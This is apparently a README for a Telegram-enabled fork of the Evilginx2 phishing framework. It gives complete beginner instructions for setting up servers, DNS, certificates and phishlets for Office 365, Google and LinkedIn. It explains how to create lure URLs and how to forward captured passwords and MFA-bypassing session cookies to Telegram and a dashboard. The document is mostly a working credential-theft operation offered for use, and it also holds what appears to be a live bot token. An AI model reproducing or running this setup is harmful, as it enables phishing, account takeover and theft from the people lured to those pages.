<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║                    🦊 EVILGINX2 — TELEGRAM EDITION                        ║
║              Complete Deployment Guide for Absolute Beginners              ║
║                                                                            ║
║                   Created by @officialmonsterz                             ║
║          Contact: t.me/officialmonsterz | shapads@tutamail.com             ║
║          Repo: github.com/officialmonsterz/evilginx2                       ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# 🦊 Evilginx2 — Telegram Edition
## Man-in-the-Middle Attack Framework with 2FA Bypass & Telegram Alerts

> **Version:** 3.3.0 — Community Edition  
> **Author:** [@officialmonsterz](https://t.me/officialmonsterz)  
> **Original Creator:** Kuba Gretzky ([@mrgretzky](https://github.com/kgretzky))  
> **Contact:** [t.me/officialmonsterz](https://t.me/officialmonsterz) | `shapads@tutamail.com` | [github.com/officialmonsterz](https://github.com/officialmonsterz)

---

## 📚 Table of Contents

1. [What Is Evilginx2?](#-what-is-evilginx2)
2. [What's Special About This Fork?](#-whats-special-about-this-fork)
3. [System Requirements](#-system-requirements)
4. [Prerequisites](#-prerequisites-you-need-before-starting)
5. [PHASE 1: Server Preparation](#-phase-1-server-preparation)
6. [PHASE 2: Install Go Programming Language](#-phase-2-install-go-programming-language)
7. [PHASE 3: Cloudflare DNS Setup](#-phase-3-cloudflare-dns-setup-critical-for-autocert)
8. [PHASE 4: Clone & Build Evilginx2](#-phase-4-clone--build-evilginx2)
9. [PHASE 5: Evilginx2 Console Configuration](#-phase-5-evilginx2-console-configuration)
10. [PHASE 6: Telegram Integration](#-phase-6-telegram-integration)
11. [PHASE 7: Phishlets & Lures](#-phase-7-phishlets--lures)
12. [PHASE 8: Systemd Service (Auto-Start on Boot)](#-phase-8-systemd-service-auto-start-on-boot)
13. [PHASE 9: Web Dashboard](#-phase-9-web-dashboard)
14. [PHASE 10: Docker Deployment](#-phase-10-docker-deployment)
15. [PHASE 11: Testing Your Setup](#-phase-11-testing-your-setup)
16. [PHASE 12: Pro Tips & Advanced Features](#-phase-12-pro-tips--advanced-features)
17. [Full Command Cheat Sheet](#-full-command-cheat-sheet)
18. [Troubleshooting](#-troubleshooting)
19. [Inside the Code — Architecture Overview](#-inside-the-code--architecture-overview)
20. [Credits & Support](#-credits--support)

---

## 🧠 What Is Evilginx2?

Evilginx2 is a **man-in-the-middle (MITM) attack framework** used for authorized penetration testing and security assessments. It acts as a **reverse proxy** between a victim and a real website (like Office 365, Google, LinkedIn, etc.).

### How It Works

```
Victim's Browser ──► Evilginx Server ──► Real Website (e.g., login.microsoftonline.com)
                            │
                            ▼
              Captures Login Credentials
                    + Session Cookies
                    (Bypasses 2FA/MFA)
                            │
                            ▼
              Telegram Notification + Web Dashboard
```

When a victim types their credentials on a phishing page served by Evilginx2, it:

1. **Proxies** the credentials to the real website (login succeeds — victim sees no error)
2. **Steals** the session cookie (which bypasses 2FA/MFA)
3. **Sends** you an instant Telegram message with all captured data
4. **Saves** everything to the built-in database and web dashboard

---

## ✨ What's Special About This Fork?

This version by **@officialmonsterz** adds powerful features on top of the original Evilginx3 v3.3.0:

| Feature | Description | Files Involved |
|---|---|---|
| 📱 **Telegram Notifications** | Instant alerts when credentials are captured | `core/notify.go`, `core/telegram_queue.go` |
| 📎 **Session Files as Attachments** | Tokens sent as `.txt` attachments with formatted messages | `core/notify.go` (function `createTxtFile`) |
| 🔄 **Auto-Updating Messages** | If more tokens arrive, the same Telegram message gets **edited** (not a new message) | `core/notify.go` (function `editMessageFile`) |
| ⏳ **Async Notification Queue** | Non-blocking notification delivery via buffered channel | `core/telegram_queue.go` |
| 📊 **Web Dashboard** | Full web UI to view, search, filter, export, and delete sessions | `core/dashboard.go` (port 5000) |
| 💾 **Built-in BuntDB Database** | Zero-config embedded database — no MySQL/PostgreSQL needed | `database/database.go`, `database/db_session.go` |
| 🐳 **Multi-Stage Docker Build** | Minimal Alpine-based Docker image (only ~18MB) | `Dockerfile`, `.dockerignore` |
| 🔐 **Dashboard Authentication** | Username/password protection for the web UI | `core/dashboard.go` (basic auth) |
| 📤 **CSV/JSON Export** | Export captured sessions for reporting | `core/dashboard.go` (API endpoints) |
| 🔍 **Session Search & Filtering** | Search by username, password, phishlet name, or IP | `core/dashboard.go` (query params) |
| 🗑️ **Delete Sessions** | Remove individual sessions from the UI | `core/dashboard.go` (DELETE endpoint) |

### Repository Structure

```
evilginx2/
├── main.go              # Entry point with dashboard flags + Telegram queue init
├── core/
│   ├── http_proxy.go    # MITM proxy engine (modified for Telegram integration)
│   ├── session.go       # In-memory session management
│   ├── config.go        # Configuration (includes Telegram chatid/teletoken setters)
│   ├── notify.go        # Telegram notification logic + token extraction + file creation
│   ├── telegram_queue.go# Async notification queue (buffered channel pattern)
│   ├── tsession.go      # Telegram session struct + database reader
│   ├── dashboard.go     # Web dashboard server (HTML/API)
│   └── ...              # Other standard Evilginx files
├── database/
│   ├── database.go      # BuntDB wrapper interface
│   └── db_session.go    # Session CRUD + Session struct definition
├── phishlets/           # YAML phishing templates
├── redirectors/         # HTML redirector pages
├── Dockerfile           # Multi-stage Docker build
└── .dockerignore        # Docker build exclusions
```

---

## 🖥️ System Requirements

| Requirement | Minimum | Recommended |
|---|---|---|
| **Operating System** | Ubuntu 20.04+ / Debian 11+ | Ubuntu 22.04 / 24.04 LTS |
| **RAM** | 512 MB | 1 GB |
| **CPU** | 1 core | 2 cores |
| **Disk Space** | 5 GB | 10 GB |
| **Domain** | 1 registered domain | e.g., `yourdomain.com` |
| **Cloudflare Account** | Free tier | Required for autocert/SSL |
| **Go Version** | 1.22 | 1.22.5 (verified compatible) |

> **💡 Tip:** A cheap VPS from DigitalOcean, Vultr, Hetzner, or Linode (~$6/month) is perfect.

---

## 📋 Prerequisites You Need Before Starting

- [ ] **A VPS** — Any Linux server with Ubuntu/Debian, root SSH access
- [ ] **A domain name** — Bought from Namecheap, GoDaddy, Cloudflare Registrar, etc.
- [ ] **A Cloudflare account** — Free tier ([cloudflare.com](https://cloudflare.com))
- [ ] **A Telegram account** — For receiving credential notifications
- [ ] **SSH client** — PuTTY (Windows) or Terminal (Mac/Linux)
- [ ] **Your server's public IP** — We'll use `173.44.141.147` as an example

---

# 🚀 PHASE 1: Server Preparation

## Step 1.1: Connect via SSH

```bash
ssh root@173.44.141.147
```

Replace with your actual server IP. Type `yes` if asked about the fingerprint.

## Step 1.2: Update System & Install Packages

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install nano wget curl git make build-essential screen fail2ban htop net-tools ufw -y
```

| Package | Purpose |
|---|---|
| `nano` | Easy text editor |
| `wget` / `curl` | Download files & test connections |
| `git` | Clone the repository |
| `make` / `build-essential` | Build tools for Go compilation |
| `screen` | Run background sessions |
| `fail2ban` | Blocks brute-force SSH attacks |
| `htop` | Real-time system monitoring |
| `net-tools` | Network utilities |
| `ufw` | Firewall management |

## Step 1.3: Configure Firewall (UFW)

```bash
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 53/udp    # DNS (for Let's Encrypt challenges)
sudo ufw allow 80/tcp    # HTTP (critical for autocert)
sudo ufw allow 443/tcp   # HTTPS (main phishing traffic)
sudo ufw allow 5000/tcp  # Dashboard
sudo ufw --force enable
sudo ufw status
```

Expected output:

```
Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
53/udp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
443/tcp                    ALLOW       Anywhere
5000/tcp                   ALLOW       Anywhere
```

## Step 1.4: Disable Conflicting DNS Service

Ubuntu's `systemd-resolved` uses port 53, which conflicts with Evilginx's built-in DNS server:

```bash
# Stop and disable the built-in DNS resolver
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Remove the current (symlinked) resolv.conf
sudo rm -f /etc/resolv.conf

# Set Cloudflare DNS as system resolvers
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf

# Lock the file so nothing overwrites it
sudo chattr +i /etc/resolv.conf
```

> **⚠️ If you get "Operation not permitted":** This means `/etc/resolv.conf` is managed by systemd-resolved or netplan. The `systemctl mask systemd-resolved` command should resolve this.

## Step 1.5: Reboot

```bash
sudo reboot
```

Wait 30-60 seconds, then reconnect via SSH.

---

# ☕ PHASE 2: Install Go Programming Language

Evilginx2 is written in Go. We need version 1.22.5 specifically.

## Step 2.1: Download Go

```bash
cd ~
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
```

## Step 2.2: Install Go

```bash
# Remove any previous Go installation
sudo rm -rf /usr/local/go

# Extract to /usr/local
sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
```

## Step 2.3: Add Go to PATH

```bash
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
```

Expected output: `go version go1.22.5 linux/amd64`

## Step 2.4: Clean Up Download

```bash
rm go1.22.5.linux-amd64.tar.gz
```

---

# ☁️ PHASE 3: Cloudflare DNS Setup

This is the most critical phase. SSL certificates **will fail** if DNS is misconfigured.

## Step 3.1: Add Your Domain to Cloudflare

1. Go to [cloudflare.com](https://cloudflare.com) and log in
2. Click **"Add a Site"**
3. Enter your domain (e.g., `entreexampdremd.online`)
4. Select the **Free** plan
5. Cloudflare will scan existing DNS records
6. **Note the two nameservers** Cloudflare gives you (e.g., `arya.ns.cloudflare.com` and `matt.ns.cloudflare.com`)

## Step 3.2: Change Nameservers at Your Registrar

Go to your domain registrar (Namecheap, GoDaddy, etc.):

1. Find **DNS / Nameservers** settings
2. Change to **Custom Nameservers**
3. Enter the two Cloudflare nameservers from Step 3.1
4. Save — propagation takes 5–15 minutes

## Step 3.3: Add DNS Records in Cloudflare

**⚠️ CRITICAL:** Set all records to **DNS Only** (grey cloud icon), **NOT** Proxy (orange cloud). Evilginx2 needs direct access to ports 80 and 443.

| Type | Name | Content | Proxy Status |
|---|---|---|---|
| A | `@` (root) | `173.44.141.147` | ❌ DNS Only |
| A | `login` | `173.44.141.147` | ❌ DNS Only |
| A | `admin` | `173.44.141.147` | ❌ DNS Only |
| A | `*` (wildcard) | `173.44.141.147` | ❌ DNS Only |

**Why each record is needed:**

| Record | Purpose |
|---|---|
| `@` (root) | Base domain for the phishlet hostname |
| `login` | Where your phishing page lives (`login.yourdomain.com`) |
| `admin` | Dashboard subdomain |
| `*` (wildcard) | Catches any subdomain you might want to use |

## Step 3.4: Configure SSL/TLS Settings

In Cloudflare dashboard:

1. Go to **SSL/TLS** → **Overview**
2. Set **SSL/TLS encryption level** to **Full** (NOT Full Strict)
3. Go to **Edge Certificates** tab
4. Turn **Always Use HTTPS** → **ON**

## Step 3.5: Verify DNS Propagation

```bash
dig @1.1.1.1 entreexampdremd.online +short
dig @1.1.1.1 login.entreexampdremd.online +short
```

Both should return your server IP. Wait 10–15 minutes if they don't.

---

# 🔧 PHASE 4: Clone & Build Evilginx2

## Step 4.1: Clone the Repository

```bash
cd /root
git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2
```

## Step 4.2: Build the Binary

```bash
# Remove old vendor directory for a clean build
rm -rf vendor/ 2>/dev/null

# Download and organize all Go dependencies
go mod tidy

# Compile the Evilginx2 binary
go build -o evilginx2 .

# Verify the binary
ls -lh evilginx2
```

Expected output: `-rwxr-xr-x 1 root root 25M ... evilginx2`

> **If `go mod tidy` fails:** Ensure Go 1.22.5 is installed (`go version`). Some modules require Go 1.22+.

---

# ⚙️ PHASE 5: Evilginx2 Console Configuration

## Step 5.1: Start Evilginx2

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
```

| Flag | Purpose |
|---|---|
| `-dashboard 0.0.0.0:5000` | Dashboard accessible on all interfaces at port 5000 |
| `-dashboard-user admin` | Dashboard login username |
| `-dashboard-pass mypass1234` | Dashboard login password |

> **Change `mypass1234` to a strong password!**

## Step 5.2: Configure Domain & IP

Inside the Evilginx console (`:` prompt):

```
: config domain entreexampdremd.online
: config ipv4 external 173.44.141.147
```

## Step 5.3: Enable Autocert (SSL Certificates)

```
: config autocert on
```

This tells Evilginx2 to automatically request and renew Let's Encrypt certificates for your domain and all subdomains.

## Step 5.4: Set Unauthorized Redirect URL

When someone visits your phishing domain without a valid lure path, they get redirected here:

```
: config unauth_url https://www.google.com
```

## Step 5.5: Configure Blacklist Mode

```
: blacklist unauth
```

| Mode | Behavior |
|---|---|
| `off` | No blacklisting |
| `unauth` | Blacklist IPs that hit unauthorized URLs (no valid lure token) |
| `all` | Blacklist every new visitor immediately |
| `noadd` | Check blacklist but don't add new IPs |

## Step 5.6: Verify Configuration

```
: config
```

Expected output:

```
domain             : entreexampdremd.online
external_ipv4      : 173.44.141.147
bind_ipv4          :
https_port         : 443
dns_port           : 53
unauth_url         : https://www.google.com
autocert           : on
gophish admin_url  :
gophish api_key    :
gophish insecure   : false
chatid             :
teletoken          :
```

---

# 📱 PHASE 6: Telegram Integration

This is the flagship feature of this fork — real-time capture notifications delivered to your Telegram.

## Step 6.1: Create a Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Send: `/newbot`
3. Choose a display name (e.g., `My Evilginx Notifier`)
4. Choose a username ending in `_bot` (e.g., `myevilginx_bot`)
5. **Copy the bot token** — it looks like: `8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo`

## Step 6.2: Verify the Bot Token

Test your bot token immediately with this curl command:

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getMe"
```

Expected response:
```json
{"ok":true,"result":{"id":8863425004,"is_bot":true,"first_name":"myevulbot","username":"evuuulbot","can_join_groups":true,...}}
```

## Step 6.3: Get Your Chat ID

1. Search for your bot on Telegram: `@YourBotName_bot`
2. Send any message to it (e.g., "Hello")
3. Run this command (uses the same token):

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getUpdates"
```

Expected response snippet:
```json
{"ok":true,"result":[{"message":{"chat":{"id":7545456339,"first_name":"Draconian",...}}}]}
```

> **`7545456339`** is your Chat ID. If `getUpdates` returns an empty `result:[]`, you haven't messaged the bot yet — send it a message first.

## Step 6.4: Test Sending a Message via API

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/sendMessage?chat_id=7545456339&text=test"
```

You should receive the message "test" in Telegram immediately.

## Step 6.5: Configure Telegram in Evilginx Console

Back in the Evilginx console (`:` prompt):

```
: config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
: config chatid 7545456339
```

## Step 6.6: Test Telegram from Inside Evilginx

```
: test telegram
```

If successful, you'll see: `Telegram test message sent successfully!` and receive a formatted test message in Telegram.

---

# 🎣 PHASE 7: Phishlets & Lures

## Step 7.1: List Available Phishlets

```
: phishlets
```

This shows all phishlets in the `/root/evilginx2/phishlets/` directory with their status (enabled/disabled).

## Step 7.2: Set Hostname for a Phishlet

```
: phishlets hostname office365 entreexampdremd.online
```

This configures the phishlet to use `login.entreexampdremd.online` as the phishing domain (the phishlet YAML defines the `login` subdomain).

## Step 7.3: Enable the Phishlet

```
: phishlets enable office365
```

## Step 7.4: Create a Lure (Phishing URL)

```
: lures create office365
```

Output:
```
lure_id: 0
tokens: ...
```

## Step 7.5: Modify the Lure (Optional)

Set a specific redirect URL for this lure (overrides the global `unauth_url`):

```
: lures edit 0 redirect-url https://www.microsoft.com
```

## Step 7.6: Set a User-Agent Filter (Optional)

Only allow specific user agents to access this lure:

```
: lures edit 0 ua_filter "Mozilla|Chrome|Safari"
```

## Step 7.7: Get Your Phishing URL

```
: lures get-url 0
```

Copy the URL shown — it will look like: `https://login.entreexampdremd.online/xxxxxx`

---

# 🔄 PHASE 8: Systemd Service (Auto-Start on Boot)

This ensures Evilginx2 starts automatically when your server reboots and restarts if it crashes.

## Step 8.1: Create the Service File

```bash
sudo nano /etc/systemd/system/evilginx.service
```

## Step 8.2: Paste the Service Configuration

```ini
[Unit]
Description=Monsterz Evilginx2 with Autocert & Dashboard
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
Restart=always
RestartSec=5
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
```

## Step 8.3: Enable and Start

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now evilginx
sudo systemctl status evilginx
```

Expected: `active (running)` in green.

## Step 8.4: View Logs

```bash
sudo journalctl -u evilginx -f
```

Press `Ctrl+C` to exit the log viewer.

## Step 8.5: Stop/Start/Restart Commands

```bash
sudo systemctl stop evilginx
sudo systemctl start evilginx
sudo systemctl restart evilginx
```

---

# 📊 PHASE 9: Web Dashboard

The web dashboard lets you view, search, filter, export, and delete captured sessions from your browser.

## Step 9.1: Access the Dashboard

Open your browser and visit:

```
http://173.44.141.147:5000
```

Or if you set up an `admin` DNS record:

```
http://admin.entreexampdremd.online:5000
```

## Step 9.2: Login

Use the credentials you set: `admin` / `mypass1234`

## Step 9.3: Dashboard Features

| Feature | How to Access |
|---|---|
| **Session List** | Main page — all captured sessions with timestamps |
| **Search** | Type in the search box to filter by username, password, phishlet, or IP |
| **Filter by Phishlet** | Use the phishlet dropdown |
| **View Details** | Click a session row to see tokens, cookies, and full data |
| **Export CSV** | Click "Export CSV" button — downloads all sessions as CSV |
| **Export JSON** | Click "Export JSON" button — downloads all sessions as JSON |
| **Delete Session** | Click the delete button on a session row |
| **Refresh** | Auto-refreshes every 5 seconds (toggleable) |
| **Dark Mode** | Toggle button in the top-right |
| **Stats** | Total sessions, unique phishlets, displayed count |

## Step 9.4: API Endpoints

The dashboard also exposes a REST API:

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/sessions` | GET | List all sessions (supports `?search=`, `?phishlet=`, `?limit=`, `?offset=`) |
| `/api/sessions/export` | GET | Export sessions (`?format=csv` or `?format=json`) |
| `/api/sessions/{id}` | GET | Get a single session by ID |
| `/api/sessions/{id}` | DELETE | Delete a single session by ID |

---

# 🐳 PHASE 10: Docker Deployment

For containerized deployment, this fork includes a multi-stage Docker build.

## Step 10.1: Build the Docker Image

```bash
cd /root/evilginx2
docker build -t evilginx2-telegram .
```

## Step 10.2: Run the Container

```bash
docker run -d \
  --name evilginx2 \
  --restart unless-stopped \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v evilginx-data:/home/evilginx/.evilginx \
  evilginx2-telegram \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass mypass1234
```

## Step 10.3: Access the Container Shell

```bash
docker exec -it evilginx2 sh
```

## Step 10.4: Docker Compose (Alternative)

Create a `docker-compose.yml`:

```yaml
version: '3.8'
services:
  evilginx2:
    build: .
    container_name: evilginx2
    restart: unless-stopped
    ports:
      - "53:53/udp"
      - "80:80"
      - "443:443"
      - "5000:5000"
    volumes:
      - evilginx-data:/home/evilginx/.evilginx
    command: >
      -dashboard 0.0.0.0:5000
      -dashboard-user admin
      -dashboard-pass mypass1234

volumes:
  evilginx-data:
```

Then run:

```bash
docker-compose up -d
```

---

# ✅ PHASE 11: Testing Your Setup

## Test 1: Dashboard

```
http://173.44.141.147:5000
```

Login with `admin` / `mypass1234`. You should see the dashboard with 0 sessions.

## Test 2: Phishing Capture

1. Copy your lure URL from `lures get-url 0`
2. Open an **Incognito/Private browser window**
3. Paste the URL and press Enter
4. You should see the Office 365 login page
5. Enter any fake credentials (e.g., `test@example.com` / `Password123!`)
6. Click **Sign in**

## Test 3: Check Telegram

Within seconds, you should receive a Telegram message with:

```
✨ Session Information ✨

👤 Username: test@example.com
🔑 Password: Password123!
🌐 Landing URL: [Link]
🖥️ User Agent: Mozilla/5.0...
🌍 Remote Address: 1.2.3.4
🕒 Created: 1780014345

📦 Tokens are attached as a separate file.
```

## Test 4: Check Dashboard

Refresh the dashboard — the session should appear with username, password, and tokens.

## Test 5: Verify Auto-Renewal

Stop and restart Evilginx2:

```bash
pkill -f evilginx2
sleep 2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
```

Verify configuration is persisted:

```
: config
```

---

# 🧠 PHASE 12: Pro Tips & Advanced Features

## 12.1: Telegram Auto-Updating Messages

When credentials are first captured, a Telegram message is sent. If additional tokens (e.g., body tokens, HTTP tokens) are captured later, the **same message is edited** rather than sending a new one. This is handled by `core/notify.go`:

```
Session captured ──► First Telegram message (with message_id stored)
    │
    ▼
More tokens arrive ──► editMessageText + editMessageMediaGroup
    │
    ▼
Same message updated ──► No duplicate notifications
```

## 12.2: Async Notification Queue

Telegram notifications are processed asynchronously via a buffered channel (`core/telegram_queue.go`), so the HTTP proxy never blocks waiting for Telegram API responses.

## 12.3: Multiple Phishlets

```bash
: phishlets hostname office365 entreexampdremd.online
: phishlets enable office365
: phishlets hostname google entreexampdremd.online
: phishlets enable google
: phishlets hostname linkedin entreexampdremd.online
: phishlets enable linkedin
: lures create office365
: lures create google
: lures create linkedin
: lures get-url 0
: lures get-url 1
: lures get-url 2
```

Each phishlet uses a different subdomain defined in its YAML file.

## 12.4: Redirector Pages

Instead of redirecting to Google, you can show a custom HTML page:

1. Place HTML files in `/root/evilginx2/redirectors/my_redirector/`
2. Edit the lure:

```
: lures edit 0 redirector my_redirector
```

## 12.5: Gophish Integration

For full campaign management with email templates and click tracking:

```
: config gophish_url https://your-gophish-server:3333
: config gophish_api your-api-key
```

## 12.6: Using screen for Persistent Sessions

```bash
screen -S evilginx
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
```

Detach with `Ctrl+A` then `D`. Reattach with `screen -r evilginx`.

## 12.7: Port Conflict Resolution

If you see "address already in use" errors:

```bash
# Kill existing Evilginx
pkill -f evilginx2

# Wait for ports to free
sleep 2

# Verify ports are free
ss -tlnp | grep -E '(:53|:443|:5000)'

# Restart
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
```

## 12.8: Database Backup

```bash
cp /root/.evilginx/data.db /root/.evilginx/data.db.backup
```

## 12.9: Viewing Captured Tokens

In the dashboard, click a session row to see the full token JSON. You can download tokens as a file compatible with browser cookie editors.

---

# 📝 Full Command Cheat Sheet

## System Commands
```bash
# Connect
ssh root@YOUR_SERVER_IP

# Update system
sudo apt update && sudo apt upgrade -y

# Firewall
sudo ufw allow 22/tcp && sudo ufw allow 53/udp && sudo ufw allow 80/tcp && sudo ufw allow 443/tcp && sudo ufw allow 5000/tcp && sudo ufw --force enable

# Fix DNS port conflict
sudo systemctl stop systemd-resolved && sudo systemctl disable systemd-resolved
sudo rm -f /etc/resolv.conf && echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
sudo chattr +i /etc/resolv.conf

# Kill Evilginx
pkill -f evilginx2
```

## Build Commands
```bash
cd /root && git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2 && go mod tidy && go build -o evilginx2 . && chmod +x evilginx2
```

## Start Evilginx2
```bash
# With Dashboard
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234

# Without Dashboard (CLI only)
./evilginx2
```

## Basic Config (inside `:` console)
```
config domain yourdomain.com
config ipv4 external YOUR_SERVER_IP
config autocert on
config unauth_url https://www.google.com
blacklist unauth
```

## Telegram Config (inside `:` console)
```
config teletoken YOUR_BOT_TOKEN
config chatid YOUR_CHAT_ID
test telegram
```

## Phishlet Commands (inside `:` console)
```
phishlets hostname office365 yourdomain.com
phishlets enable office365
lures create office365
lures edit 0 redirect-url https://www.google.com
lures get-url 0
sessions
sessions <id>
```

## Service Management
```bash
sudo systemctl enable --now evilginx
sudo systemctl status evilginx
sudo journalctl -u evilginx -f
```

## Telegram API Testing
```bash
# Test token
curl -s "https://api.telegram.org/botTOKEN/getMe"

# Get chat ID (message the bot first)
curl -s "https://api.telegram.org/botTOKEN/getUpdates"

# Send test message
curl -s "https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=Hello%20from%20Evilginx"
```

---

# 🔧 Troubleshooting

## Autocert Fails — "port 80 not available"

```
sudo lsof -i :80
```

Port 80 is used by Let's Encrypt for domain validation. Make sure no other service (Apache, Nginx, Caddy) is using it.

## "certificate error" in Browser

1. Verify DNS records point to your server IP with **grey cloud** (DNS Only)
2. Wait for DNS propagation (10–15 minutes)
3. Check autocert is enabled: `config autocert on`
4. Check domain is set: `config domain yourdomain.com`

## Telegram Not Sending Notifications

```bash
# 1. Test the bot token directly
curl -s "https://api.telegram.org/botYOUR_TOKEN/getMe"

# 2. Test sending a message
curl -s "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHATID&text=test"

# 3. Verify config inside Evilginx
: config
```

## Dashboard Not Loading

```bash
sudo ufw status | grep 5000
```

If not listed: `sudo ufw allow 5000/tcp`

## "address already in use"

```bash
pkill -f evilginx2
sleep 2
ss -tlnp | grep -E '(:53|:443|:5000)'
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
```

## DNS Not Resolving

```bash
# Check DNS propagation
dig @1.1.1.1 yourdomain.com +short

# Should return your server IP
```

## Build Fails — Go Version

```bash
go version
# Must be go1.22.5
```

## Phishlet Shows "Not Found"

```bash
: phishlets
```

Make sure `phishlets hostname` was run **before** `phishlets enable`.

## Systemd Service Fails to Start

```bash
sudo journalctl -u evilginx -n 50 --no-pager
```

Check for permission errors, missing paths, or port conflicts.

---

# 🧩 Inside the Code — Architecture Overview

## How the Components Fit Together

```
main.go
  │
  ├──► Starts Nameserver (DNS)
  ├──► Starts CertDB (SSL certificates)
  ├──► Starts HttpProxy (MITM proxy engine)
  ├──► Starts Telegram Queue (async notification processor)
  │       │
  │       └──► core/telegram_queue.go
  │               │
  │               └──► core/notify.go (createTxtFile, sendTelegramNotification, editMessageFile)
  │
  ├──► Starts Dashboard Server (web UI)
  │       │
  │       └──► core/dashboard.go (HTML template + REST API)
  │
  ├──► Starts Terminal (CLI interface)
  │
  └──► On exit: stops dashboard and telegram queue
```

## Key Data Flow: Capture to Notification

```
1. Victim submits credentials on phishing page
         │
         ▼
2. HttpProxy.OnRequest() captures POST body
   ──► Extracts username/password from form or JSON
   ──► Stores in Session object (core/session.go)
         │
         ▼
3. HttpProxy.OnResponse() intercepts response
   ──► Captures Set-Cookie headers (session tokens)
   ──► Captures body tokens / HTTP header tokens
   ──► Checks if all auth tokens are captured
         │
         ▼
4. If all tokens captured:
   ──► Saves to database (database/db_session.go)
   ──► Calls sendTelegramNotificationForSession()
         │
         ▼
5. Enqueues TelegramJob (core/telegram_queue.go)
   ──► Async goroutine processes the queue
         │
         ▼
6. core/notify.go:
   ──► Creates .txt file with cookies/tokens
   ──► Sends formatted message + file attachment
   ──► Stores message_id for future edits
         │
         ▼
7. If more tokens arrive later:
   ──► Edits the same Telegram message (no duplicate)
   ──► Sends updated .txt attachment
```

## Key Files and Their Roles

| File | Role |
|---|---|
| `main.go` | Application entry point. Parses flags (`-dashboard`, `-dashboard-user`, `-dashboard-pass`), initializes all components, starts/shuts down gracefully |
| `core/http_proxy.go` | The MITM proxy engine. Handles request interception, cookie capture, URL rewriting, credential extraction, and session management |
| `core/session.go` | In-memory session representation. Tracks username, password, tokens, redirect URL, and completion state |
| `core/notify.go` | Telegram notification engine. Formats messages, creates token `.txt` files, sends via Telegram API, edits existing messages |
| `core/telegram_queue.go` | Async notification queue. Uses a buffered channel to process Telegram notifications without blocking the proxy |
| `core/tsession.go` | Telegram session struct (`TSession`) used for JSON serialization when communicating with Telegram API |
| `core/dashboard.go` | Web dashboard server. Serves HTML template, provides REST API for sessions, supports search/filter/export/delete |
| `core/config.go` | Configuration manager. Includes `SetChatid()`, `SetTeletoken()`, and `ValidateTelegramConfig()` methods |
| `database/database.go` | BuntDB database wrapper. Provides `CreateSession`, `ListSessions`, `DeleteSession`, etc. |
| `database/db_session.go` | Session struct definition (`Id`, `Phishlet`, `Username`, `Password`, `SessionId`, `CookieTokens`, etc.) and CRUD operations |
| `Dockerfile` | Multi-stage Docker build (golang:1.22-alpine → alpine:latest, ~18MB final image) |

## Database Session Schema

```go
type Session struct {
    Id           int                                // Auto-incremented ID
    Phishlet     string                             // e.g., "office365"
    LandingURL   string                             // The lure URL the victim visited
    Username     string                             // Captured username/email
    Password     string                             // Captured password
    Custom       map[string]string                  // Custom fields from phishlet
    BodyTokens   map[string]string                  // Tokens extracted from HTTP response body
    HttpTokens   map[string]string                  // Tokens extracted from HTTP headers
    CookieTokens map[string]map[string]*CookieToken // Session cookies (the 2FA bypass)
    SessionId    string                             // Unique session identifier (UUID)
    UserAgent    string                             // Victim's browser user-agent
    RemoteAddr   string                             // Victim's IP address
    CreateTime   int64                              // Unix timestamp of creation
    UpdateTime   int64                              // Unix timestamp of last update
    Cmsgid       string                             // Telegram message ID for credential notification
    Tmsgid       string                             // Telegram message ID for token notification
}
```

## Telegram Notification Flow

```
                    ┌─────────────────────────┐
                    │  Session Captured       │
                    │  (credentials + tokens) │
                    └───────────┬─────────────┘
                                │
                                ▼
                    ┌─────────────────────────┐
                    │  Enqueue TelegramJob    │
                    │  (async, non-blocking)  │
                    └───────────┬─────────────┘
                                │
                                ▼
                    ┌─────────────────────────┐
                    │  Create .txt file with  │
                    │  formatted token JSON   │
                    └───────────┬─────────────┘
                                │
                                ▼
                    ┌─────────────────────────────┐
                    │  Is this session already    │
                    │  processed?                 │
                    │  (check processedSessions)  │
                    └───────┬─────────────┬───────┘
                            │             │
